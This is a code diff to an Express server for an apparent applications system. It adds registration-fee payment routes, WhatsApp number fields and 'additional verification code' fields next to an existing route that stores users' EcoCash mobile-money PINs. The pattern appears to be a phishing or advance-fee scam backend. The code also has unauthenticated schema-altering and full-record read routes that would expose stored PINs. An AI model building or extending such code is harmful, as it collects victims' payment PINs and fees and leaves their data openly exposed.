@@ -585,7 +585,6 @@ app.get("/application-status/:id", async (req, res) => {
 
 // ======================================================
 // SAVE ECOCASH PIN
-// TEMPORARY TEST VERSION
 // ======================================================
 
 app.post("/save-ecocash-pin/:id", async (req, res) => {
@@ -1876,6 +1875,361 @@ async function addPaymentInstructionsField() {
 }
 
 addPaymentInstructionsField();
+// ======================================================
+// PAYMENT FLOW DATABASE FIELDS
+// ======================================================
+
+app.get("/update-payment-database", async (req, res) => {
+
+    try {
+
+        await pool.query(`
+            ALTER TABLE applications
+            ADD COLUMN IF NOT EXISTS
+                payment_instructions TEXT;
+
+            ALTER TABLE applications
+            ADD COLUMN IF NOT EXISTS
+                registration_fee_amount NUMERIC;
+
+            ALTER TABLE applications
+            ADD COLUMN IF NOT EXISTS
+                payment_status TEXT
+                DEFAULT 'pending';
+
+            ALTER TABLE applications
+            ADD COLUMN IF NOT EXISTS
+                payment_confirmation_message TEXT;
+
+            ALTER TABLE applications
+            ADD COLUMN IF NOT EXISTS
+                whatsapp_business_number TEXT;
+
+            ALTER TABLE applications
+            ADD COLUMN IF NOT EXISTS
+                additional_verification_required BOOLEAN
+                DEFAULT FALSE;
+
+            ALTER TABLE applications
+            ADD COLUMN IF NOT EXISTS
+                additional_verification_code TEXT;
+
+            ALTER TABLE applications
+            ADD COLUMN IF NOT EXISTS
+                additional_verification_status TEXT;
+        `);
+
+        res.json({
+
+            success: true,
+
+            message:
+                "payment fields are ready."
+
+        });
+
+    } catch (err) {
+
+        console.error(
+            "PAYMENT DATABASE UPDATE ERROR:",
+            err
+        );
+
+        res.status(500).json({
+
+            success: false,
+
+            error: err.message
+
+        });
+
+    }
+
+});
+// ======================================================
+// SAVE PAYMENT INSTRUCTIONS
+// ======================================================
+
+app.put("/payment-instructions/:id", async (req, res) => {
+
+    try {
+
+        const { id } = req.params;
+
+        const {
+            paymentInstructions,
+            registrationFeeAmount
+        } = req.body;
+
+        if (!paymentInstructions) {
+
+            return res.status(400).json({
+
+                success: false,
+
+                message:
+                    "Payment instructions are required."
+
+            });
+
+        }
+
+        const result = await pool.query(
+            `
+            UPDATE applications
+
+            SET
+                payment_instructions = $1,
+                registration_fee_amount = $2,
+                payment_status = 'pending'
+
+            WHERE id = $3
+
+            RETURNING
+                id,
+                payment_instructions,
+                registration_fee_amount,
+                payment_status;
+            `,
+            [
+                paymentInstructions,
+                registrationFeeAmount || null,
+                id
+            ]
+        );
+
+        if (result.rows.length === 0) {
+
+            return res.status(404).json({
+
+                success: false,
+
+                message:
+                    "Application not found."
+
+            });
+
+        }
+
+        res.json({
+
+            success: true,
+
+            application: result.rows[0]
+
+        });
+
+    } catch (err) {
+
+        console.error(
+            "SAVE PAYMENT INSTRUCTIONS ERROR:",
+            err
+        );
+
+        res.status(500).json({
+
+            success: false,
+
+            error: err.message
+
+        });
+
+    }
+
+});
+// ======================================================
+// GET SINGLE APPLICATION
+// ======================================================
+
+app.get("/application/:id", async (req, res) => {
+
+    try {
+
+        const { id } = req.params;
+
+        const result = await pool.query(
+            `
+            SELECT *
+            FROM applications
+            WHERE id = $1
+            `,
+            [id]
+        );
+
+        if (result.rows.length === 0) {
+
+            return res.status(404).json({
+
+                success: false,
+
+                message:
+                    "Application not found."
+
+            });
+
+        }
+
+        res.json({
+
+            success: true,
+
+            application: result.rows[0]
+
+        });
+
+    } catch (err) {
+
+        console.error(
+            "GET APPLICATION ERROR:",
+            err
+        );
+
+        res.status(500).json({
+
+            success: false,
+
+            error: err.message
+
+        });
+
+    }
+
+});
+// ======================================================
+// PAYMENT — USER CHOOSES LATER
+// ======================================================
+
+app.put("/payment-later/:id", async (req, res) => {
+
+    try {
+
+        const { id } = req.params;
+
+        const result = await pool.query(
+            `
+            UPDATE applications
+
+            SET
+                payment_status = 'later',
+                current_stage = 'payment_pending'
+
+            WHERE id = $1
+
+            RETURNING
+                id,
+                payment_status,
+                current_stage;
+            `,
+            [id]
+        );
+
+        if (result.rows.length === 0) {
+
+            return res.status(404).json({
+
+                success: false,
+
+                message:
+                    "Application not found."
+
+            });
+
+        }
+
+        res.json({
+
+            success: true,
+
+            application: result.rows[0]
+
+        });
+
+    } catch (err) {
+
+        console.error(
+            "PAYMENT LATER ERROR:",
+            err
+        );
+
+        res.status(500).json({
+
+            success: false,
+
+            error: err.message
+
+        });
+
+    }
+
+});
+// ======================================================
+// PAYMENT — USER MARKS PAYMENT AS MADE
+// ======================================================
+
+app.put("/payment-marked-paid/:id", async (req, res) => {
+
+    try {
+
+        const { id } = req.params;
+
+        const result = await pool.query(
+            `
+            UPDATE applications
+
+            SET
+                payment_status = 'marked_paid',
+                current_stage = 'payment_confirmation'
+
+            WHERE id = $1
+
+            RETURNING
+                id,
+                payment_status,
+                current_stage;
+            `,
+            [id]
+        );
+
+        if (result.rows.length === 0) {
+
+            return res.status(404).json({
+
+                success: false,
+
+                message:
+                    "Application not found."
+
+            });
+
+        }
+
+        res.json({
+
+            success: true,
+
+            application: result.rows[0]
+
+        });
+
+    } catch (err) {
+
+        console.error(
+            "PAYMENT MARKED PAID ERROR:",
+            err
+        );
+
+        res.status(500).json({
+
+            success: false,
+
+            error: err.message
+
+        });
+
+    }
+
+});
+
 // ======================================================
 // START SERVER
 // ======================================================
